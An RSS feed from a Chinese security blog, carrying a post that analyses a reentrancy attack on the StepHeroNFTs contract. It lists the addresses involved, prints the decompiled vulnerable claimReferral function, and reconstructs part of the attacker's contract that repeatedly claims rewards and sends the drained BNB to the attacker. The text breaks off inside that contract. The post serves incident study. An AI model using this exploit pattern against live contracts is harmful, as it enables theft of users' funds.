<?xml-stylesheet href="/rss.xsl" type="text/xsl"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Passi0n1&#39;s Blog</title>
    <link>http://localhost:1313/</link>
    <description>Recent content on Passi0n1&#39;s Blog</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>zh-cn</language>
    <copyright>Rise. 本站遵循 CC-BY-NC 4.0 协议</copyright>
    <lastBuildDate>Fri, 21 Feb 2025 11:25:05 +0000</lastBuildDate>
    
        <atom:link href="http://localhost:1313/index.xml" rel="self" type="application/rss+xml" />
    
    
    
        <item>
        <title>StephereNFTs 遭遇重入攻击分析</title>
        <link>http://localhost:1313/posts/vol.1--step-hero%E9%87%8D%E5%85%A5%E6%94%BB%E5%87%BB/</link>
        <pubDate>Fri, 21 Feb 2025 11:25:05 +0000</pubDate>
        
        <guid>http://localhost:1313/posts/vol.1--step-hero%E9%87%8D%E5%85%A5%E6%94%BB%E5%87%BB/</guid>
        <description>Passi0n1&#39;s Blog http://localhost:1313/posts/vol.1--step-hero%E9%87%8D%E5%85%A5%E6%94%BB%E5%87%BB/ -&lt;h2 id=&#34;攻击概述&#34;&gt;攻击概述&lt;/h2&gt;
&lt;p&gt;2025 年 2 月 ，StephereNFTs 遭遇了一起严重的重入攻击，攻击者通过精心构造的恶意合约，利用智能合约逻辑漏洞，成功盗取了大量资金。&lt;/p&gt;
&lt;h3 id=&#34;参考地址&#34;&gt;参考地址：&lt;/h3&gt;
&lt;p&gt;&lt;a href=&#34;https://nickfranklin.site/2025/02/21/stepheronfts-attacked/&#34;&gt;https://nickfranklin.site/2025/02/21/stepheronfts-attacked/&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&#34;相关地址&#34;&gt;相关地址&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;受害合约地址&lt;/strong&gt;：&lt;code&gt;0x9823e10a0bf6f64f59964be1a7f83090bf5728ab&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;攻击者地址&lt;/strong&gt;：&lt;code&gt;0xFb1cc1548D039f14b02cfF9aE86757Edd2CDB8A5&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;恶意合约1&lt;/strong&gt;：&lt;code&gt;0xd4c80700ca911d5d3026a595e12aa4174f4cacb3&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;恶意合约2&lt;/strong&gt;：&lt;code&gt;0xb4c32404de3367ca94385ac5b952a7a84b5bdf76&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;恶意合约3&lt;/strong&gt;：&lt;code&gt;0x8f327e60fb2a7928c879c135453bd2b4ed6b0fe9&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;攻击交易 (tx)&lt;/strong&gt;：https://bscscan.com/tx/0xef386a69ca6a147c374258a1bf40221b0b6bd9bc449a7016dbe5240644581877&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;攻击步骤解析&#34;&gt;攻击步骤解析&lt;/h2&gt;
&lt;h3 id=&#34;1-部署恶意合约&#34;&gt;1. 部署恶意合约&lt;/h3&gt;
&lt;p&gt;攻击者首先部署了多个恶意合约，以便后续进行重入攻击。&lt;/p&gt;
&lt;center&gt;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/images/424896141-692a2eae-d3d7-40bc-b16b-d86c061c5645.png&#34; width=&#34;100%&#34;&gt;&lt;figcaption&gt;
      &lt;h4&gt;图1&lt;/h4&gt;
    &lt;/figcaption&gt;
&lt;/figure&gt;
&lt;/center&gt;
&lt;h3 id=&#34;2-通过闪电贷获取初始资金&#34;&gt;2. 通过闪电贷获取初始资金&lt;/h3&gt;
&lt;p&gt;攻击者利用闪电贷借入了一笔资金，用于后续触发合约的奖励机制。&lt;/p&gt;
&lt;center&gt;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/images/424903484-37fadaff-fa68-43cf-b0a7-c7d5f971b4c2.png&#34; width=&#34;100%&#34;&gt;&lt;figcaption&gt;
      &lt;h4&gt;图2&lt;/h4&gt;
    &lt;/figcaption&gt;
&lt;/figure&gt;
&lt;/center&gt;
&lt;center&gt;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/images/424903603-00bd518d-2372-4e43-a7c6-f7b91f26245d.png&#34; width=&#34;100%&#34;&gt;&lt;figcaption&gt;
      &lt;h4&gt;图3&lt;/h4&gt;
    &lt;/figcaption&gt;
&lt;/figure&gt;
&lt;/center&gt;
通过购买资产获取奖励资格
&lt;h3 id=&#34;3-通过重入攻击不断获取受害合约资金&#34;&gt;3. 通过重入攻击不断获取受害合约资金&lt;/h3&gt;
&lt;p&gt;攻击者发现受害合约的奖励机制存在漏洞：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;在领取奖励时，合约会检查推荐奖励的数量。&lt;/li&gt;
&lt;li&gt;但由于合约先发放奖励，再将奖励计数清零，导致可以在清零前重复调用领取奖励函数，实现重入攻击。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;攻击者利用这一漏洞，不断调用恶意合约，通过递归方式重复领取奖励，最终盗取了大量资金。&lt;/p&gt;
&lt;h2 id=&#34;关键漏洞分析&#34;&gt;关键漏洞分析&lt;/h2&gt;
&lt;p&gt;该攻击的核心漏洞在于 &lt;strong&gt;先发奖励后清零&lt;/strong&gt; 的逻辑顺序问题，导致了经典的重入攻击 (Reentrancy Attack)。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;漏洞代码示例&lt;/strong&gt;：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-solidity&#34; data-lang=&#34;solidity&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;function&lt;/span&gt; &lt;span style=&#34;color:#008b45&#34;&gt;claimReferral&lt;/span&gt;(&lt;span style=&#34;color:#00688b;font-weight:bold&#34;&gt;address&lt;/span&gt; varg0) &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;public&lt;/span&gt; nonPayable {  find similar
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#658b00&#34;&gt;require&lt;/span&gt;(&lt;span style=&#34;color:#658b00&#34;&gt;msg&lt;/span&gt;.&lt;span style=&#34;color:#658b00&#34;&gt;data&lt;/span&gt;.length - &lt;span style=&#34;color:#b452cd&#34;&gt;4&lt;/span&gt; &amp;gt;= &lt;span style=&#34;color:#b452cd&#34;&gt;32&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#658b00&#34;&gt;require&lt;/span&gt;(!_paused, Error(&lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;Pausable: paused&amp;#39;&lt;/span&gt;));
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#658b00&#34;&gt;require&lt;/span&gt;(owner_5[&lt;span style=&#34;color:#658b00&#34;&gt;msg&lt;/span&gt;.&lt;span style=&#34;color:#658b00&#34;&gt;sender&lt;/span&gt;][varg0], Error(&lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;not-enough-money&amp;#39;&lt;/span&gt;));
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#b452cd&#34;&gt;0x2d1e&lt;/span&gt;(varg0, owner_5[&lt;span style=&#34;color:#658b00&#34;&gt;msg&lt;/span&gt;.&lt;span style=&#34;color:#658b00&#34;&gt;sender&lt;/span&gt;][varg0], &lt;span style=&#34;color:#658b00&#34;&gt;msg&lt;/span&gt;.&lt;span style=&#34;color:#658b00&#34;&gt;sender&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    owner_5[&lt;span style=&#34;color:#658b00&#34;&gt;msg&lt;/span&gt;.&lt;span style=&#34;color:#658b00&#34;&gt;sender&lt;/span&gt;][varg0] = &lt;span style=&#34;color:#b452cd&#34;&gt;0&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    emit &lt;span style=&#34;color:#b452cd&#34;&gt;0x9c21c092f05b64df5ae0cbf557b9bf4e9695cdbeaa13fcf9a0831bce847f0cfb&lt;/span&gt;(&lt;span style=&#34;color:#658b00&#34;&gt;msg&lt;/span&gt;.&lt;span style=&#34;color:#658b00&#34;&gt;sender&lt;/span&gt;, varg0, owner_5[&lt;span style=&#34;color:#658b00&#34;&gt;msg&lt;/span&gt;.&lt;span style=&#34;color:#658b00&#34;&gt;sender&lt;/span&gt;][varg0]);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;攻击者可以重复调用重新调用 &lt;code&gt;claimReferral&lt;/code&gt;，从而在清零前多次获取奖励。&lt;/p&gt;
&lt;p&gt;具体发送的函数&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-solidity&#34; data-lang=&#34;solidity&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;function&lt;/span&gt; &lt;span style=&#34;color:#b452cd&#34;&gt;0x2d1e&lt;/span&gt;(&lt;span style=&#34;color:#00688b;font-weight:bold&#34;&gt;address&lt;/span&gt; varg0, &lt;span style=&#34;color:#00688b;font-weight:bold&#34;&gt;uint256&lt;/span&gt; varg1, &lt;span style=&#34;color:#00688b;font-weight:bold&#34;&gt;address&lt;/span&gt; varg2) &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;private&lt;/span&gt; { 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;if&lt;/span&gt; (varg0) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        MEM[MEM[&lt;span style=&#34;color:#b452cd&#34;&gt;64&lt;/span&gt;] + &lt;span style=&#34;color:#b452cd&#34;&gt;36&lt;/span&gt;] = varg2;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        MEM[MEM[&lt;span style=&#34;color:#b452cd&#34;&gt;64&lt;/span&gt;] + &lt;span style=&#34;color:#b452cd&#34;&gt;68&lt;/span&gt;] = varg1;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#b452cd&#34;&gt;0x2c96&lt;/span&gt;(&lt;span style=&#34;color:#b452cd&#34;&gt;100&lt;/span&gt; + MEM[&lt;span style=&#34;color:#b452cd&#34;&gt;64&lt;/span&gt;], &lt;span style=&#34;color:#b452cd&#34;&gt;0xa9059cbb00000000000000000000000000000000000000000000000000000000&lt;/span&gt;, varg0);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;return&lt;/span&gt; ;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    } &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;else&lt;/span&gt; {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        v0, &lt;span style=&#34;color:#228b22&#34;&gt;/* uint256 */&lt;/span&gt; v1 = varg2.&lt;span style=&#34;color:#658b00&#34;&gt;call&lt;/span&gt;().&lt;span style=&#34;color:#658b00&#34;&gt;value&lt;/span&gt;(varg1).&lt;span style=&#34;color:#658b00&#34;&gt;gas&lt;/span&gt;(&lt;span style=&#34;color:#658b00&#34;&gt;msg&lt;/span&gt;.&lt;span style=&#34;color:#658b00&#34;&gt;gas&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;if&lt;/span&gt; (RETURNDATASIZE() != &lt;span style=&#34;color:#b452cd&#34;&gt;0&lt;/span&gt;) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            v2 = &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;new&lt;/span&gt; &lt;span style=&#34;color:#00688b;font-weight:bold&#34;&gt;bytes&lt;/span&gt;[](RETURNDATASIZE());
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            v1 = v2.&lt;span style=&#34;color:#658b00&#34;&gt;data&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            RETURNDATACOPY(v1, &lt;span style=&#34;color:#b452cd&#34;&gt;0&lt;/span&gt;, RETURNDATASIZE());
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        }
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#658b00&#34;&gt;require&lt;/span&gt;(v0, Error(&lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;transfer-BNB-failed&amp;#39;&lt;/span&gt;));
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;return&lt;/span&gt; ;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;另外这里展示下黑客用来实现反复调用的第三部分恶意合约：
(使用LLM处理了一下)&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-solidity&#34; data-lang=&#34;solidity&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#228b22&#34;&gt;// SPDX-License-Identifier: MIT
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#228b22&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;pragma solidity&lt;/span&gt; ^&lt;span style=&#34;color:#b452cd&#34;&gt;0&lt;/span&gt;.&lt;span style=&#34;color:#b452cd&#34;&gt;8&lt;/span&gt;.&lt;span style=&#34;color:#b452cd&#34;&gt;20&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;contract&lt;/span&gt; &lt;span style=&#34;color:#008b45;font-weight:bold&#34;&gt;TokenHandler&lt;/span&gt; {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#00688b;font-weight:bold&#34;&gt;address&lt;/span&gt; &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;private&lt;/span&gt; owner;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#00688b;font-weight:bold&#34;&gt;address&lt;/span&gt; &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;private&lt;/span&gt; token1;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#00688b;font-weight:bold&#34;&gt;address&lt;/span&gt; &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;private&lt;/span&gt; token2 = &lt;span style=&#34;color:#b452cd&#34;&gt;0xFb1cC1548d039f14b02cfF9ae86757edD2cdB8A5&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;constructor&lt;/span&gt;() {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        owner = &lt;span style=&#34;color:#658b00&#34;&gt;msg&lt;/span&gt;.&lt;span style=&#34;color:#658b00&#34;&gt;sender&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;modifier&lt;/span&gt; &lt;span style=&#34;color:#008b45&#34;&gt;onlyOwner&lt;/span&gt;() {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#658b00&#34;&gt;require&lt;/span&gt;(&lt;span style=&#34;color:#658b00&#34;&gt;msg&lt;/span&gt;.&lt;span style=&#34;color:#658b00&#34;&gt;sender&lt;/span&gt; == owner, &lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#34;invalid sender&amp;#34;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;_&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;function&lt;/span&gt; &lt;span style=&#34;color:#008b45&#34;&gt;func_6f2db99c&lt;/span&gt;() &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;external&lt;/span&gt; {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#228b22&#34;&gt;// 调用 owner 的某个函数 (e61aee51)
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#228b22&#34;&gt;&lt;/span&gt;        &lt;span style=&#34;color:#228b22&#34;&gt;//重复调用claimReferral函数
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#228b22&#34;&gt;&lt;/span&gt;        (&lt;span style=&#34;color:#00688b;font-weight:bold&#34;&gt;bool&lt;/span&gt; success, ) = owner.&lt;span style=&#34;color:#658b00&#34;&gt;call&lt;/span&gt;(&lt;span style=&#34;color:#658b00&#34;&gt;abi&lt;/span&gt;.&lt;span style=&#34;color:#658b00&#34;&gt;encodeWithSignature&lt;/span&gt;(&lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#34;e61aee51()&amp;#34;&lt;/span&gt;));
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#658b00&#34;&gt;require&lt;/span&gt;(success);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;function&lt;/span&gt; &lt;span style=&#34;color:#008b45&#34;&gt;withdraw&lt;/span&gt;(&lt;span style=&#34;color:#00688b;font-weight:bold&#34;&gt;address&lt;/span&gt; token, &lt;span style=&#34;color:#00688b;font-weight:bold&#34;&gt;uint256&lt;/span&gt; amount) &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;external&lt;/span&gt; onlyOwner {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#228b22&#34;&gt;// 获取 token 在调用者地址的余额
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#228b22&#34;&gt;&lt;/span&gt;        (&lt;span style=&#34;color:#00688b;font-weight:bold&#34;&gt;bool&lt;/span&gt; success1, &lt;span style=&#34;color:#00688b;font-weight:bold&#34;&gt;bytes&lt;/span&gt; &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;memory&lt;/span&gt; &lt;span style=&#34;color:#658b00&#34;&gt;data&lt;/span&gt;) = token.&lt;span style=&#34;color:#658b00&#34;&gt;call&lt;/span&gt;(
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#658b00&#34;&gt;abi&lt;/span&gt;.&lt;span style=&#34;color:#658b00&#34;&gt;encodeWithSelector&lt;/span&gt;(&lt;span style=&#34;color:#b452cd&#34;&gt;0x70a08231&lt;/span&gt;, &lt;span style=&#34;color:#00688b;font-weight:bold&#34;&gt;address&lt;/span&gt;(&lt;span style=&#34;color:#658b00&#34;&gt;this&lt;/span&gt;))
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        );
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#658b00&#34;&gt;require&lt;/span&gt;(success1);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#00688b;font-weight:bold&#34;&gt;uint256&lt;/span&gt; &lt;span style=&#34;color:#658b00&#34;&gt;balance&lt;/span&gt; = &lt;span style=&#34;color:#658b00&#34;&gt;abi&lt;/span&gt;.&lt;span style=&#34;color:#658b00&#34;&gt;decode&lt;/span&gt;(&lt;span style=&#34;color:#658b00&#34;&gt;data&lt;/span&gt;, (&lt;span style=&#34;color:#00688b;font-weight:bold&#34;&gt;uint256&lt;/span&gt;));
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#228b22&#34;&gt;// 调用 withdraw (0x2e1a7d4d)
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#228b22&#34;&gt;&lt;/span&gt;        (&lt;span style=&#34;color:#00688b;font-weight:bold&#34;&gt;bool&lt;/span&gt; success2, ) = token.&lt;span style=&#34;color:#658b00&#34;&gt;call&lt;/span&gt;(&lt;span style=&#34;color:#658b00&#34;&gt;abi&lt;/span&gt;.&lt;span style=&#34;color:#658b00&#34;&gt;encodeWithSelector&lt;/span&gt;(&lt;span style=&#34;color:#b452cd&#34;&gt;0x2e1a7d4d&lt;/span&gt;, &lt;span style=&#34;color:#658b00&#34;&gt;balance&lt;/span&gt;));
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#658b00&#34;&gt;require&lt;/span&gt;(success2);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#228b22&#34;&gt;// 调用 token 的 transfer 函数
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#228b22&#34;&gt;&lt;/span&gt;        (&lt;span style=&#34;color:#00688b;font-weight:bold&#34;&gt;bool&lt;/span&gt; success3, ) = token.&lt;span style=&#34;color:#658b00&#34;&gt;call&lt;/span&gt;(
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#658b00&#34;&gt;abi&lt;/span&gt;.&lt;span style=&#34;color:#658b00&#34;&gt;encodeWithSelector&lt;/span&gt;(&lt;span style=&#34;color:#b452cd&#34;&gt;0xa9059cbb&lt;/span&gt;, &lt;span style=&#34;color:#658b00&#34;&gt;msg&lt;/span&gt;.&lt;span style=&#34;color:#658b00&#34;&gt;sender&lt;/span&gt;, &lt;span style=&#34;color:#658b00&#34;&gt;balance&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        );
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#658b00&#34;&gt;require&lt;/span&gt;(success3);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#228b22&#34;&gt;// 向 msg.sender 发送 1 wei
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#228b22&#34;&gt;&lt;/span&gt;        (&lt;span style=&#34;color:#00688b;font-weight:bold&#34;&gt;bool&lt;/span&gt; success4, ) = &lt;span style=&#34;color:#658b00&#34;&gt;msg&lt;/span&gt;.&lt;span style=&#34;color:#658b00&#34;&gt;sender&lt;/span&gt;.&lt;span style=&#34;color:#658b00&#34;&gt;call&lt;/span&gt;{&lt;span style=&#34;color:#658b00&#34;&gt;value&lt;/span&gt;: &lt;span style=&#34;color:#b452cd&#34;&gt;1&lt;/span&gt;}(&lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#658b00&#34;&gt;require&lt;/span&gt;(success4);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#228b22&#34;&gt;// 向 token2 发送当前合约余额
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#228b22&#34;&gt;&lt;/span&gt;        (&lt;span style=&#34;color:#00688b;font-weight:bold&#34;&gt;bool&lt;/span&gt; success5, ) = token2.&lt;span style=&#34;color:#658b00&#34;&gt;call&lt;/span&gt;{&lt;span style=&#34;color:#658b00&#34;&gt;value&lt;/span&gt;: &lt;span style=&#34;color:#00688b;font-weight:bold&#34;&gt;address&lt;/span&gt;(&lt;span style=&#34;color:#658b00&#34;&gt;this&lt;/span&gt;).&lt;span style=&#34;color:#658b00&#34;&gt;balance&lt;/span&gt;}(&lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#658b00&#34;&gt;require&lt;/span&gt;(success5);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;function&lt;/span&gt; &lt;span style=&#34;color:#008b45&#34;&gt;executeCall&lt;/span&gt;() &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;internal&lt;/span&gt; {
